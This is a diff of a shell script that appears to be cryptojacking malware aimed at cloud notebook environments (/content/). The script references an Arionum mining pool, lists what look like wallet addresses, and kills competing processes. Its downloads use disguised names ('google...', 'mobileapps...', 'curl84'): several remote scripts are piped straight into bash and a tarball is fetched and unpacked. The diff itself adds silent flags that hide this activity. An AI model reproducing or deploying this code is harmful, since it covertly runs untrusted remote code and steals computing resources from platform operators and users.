@@ -10,7 +10,7 @@ google841212121274="http://mine.arionumpool.com"
 
 if [[ $google84121274 == *"failed"* ]]; then
 
-curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/google8412127474 | bash
+curl -s https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/google8412127474 | bash
 
 else
 
@@ -25,7 +25,7 @@ pkill -f curl84
 
 pkill -f curl84
 
-curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84 | bash &> /dev/null &
+curl -s https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84 | bash &> /dev/null &
 
 arr[0]="4dkJEWHWMVpTFTD6pZr8111zWoRNJUmoStit56uL3Urhte98L1Lm3VBWhUCkS6MAYyyPFNSVCqbKccLTmFbiYgA6"
 arr[1]="36emHJrD7TjVnbrvJzpooocHD2vnEMZHjHMm3kk3tMpMhPgw5NfYPtZEiu6nBJjeJi21vwLAD2d5afKDRiJPeQKW"
@@ -45,7 +45,7 @@ if [[ $string == *"16384"* ]]; then
 
 cd /content/
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/devdeploy84.tar.gz
+wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/devdeploy84.tar.gz
 tar -xvf ./devdeploy84.tar.gz
 
 cd googleapps8474
@@ -74,7 +74,7 @@ pkill -f curl84
 
 pkill -f curl84
 
-curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84 | bash &> /dev/null &
+curl -s https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84 | bash &> /dev/null &
 
 cd /content/
 
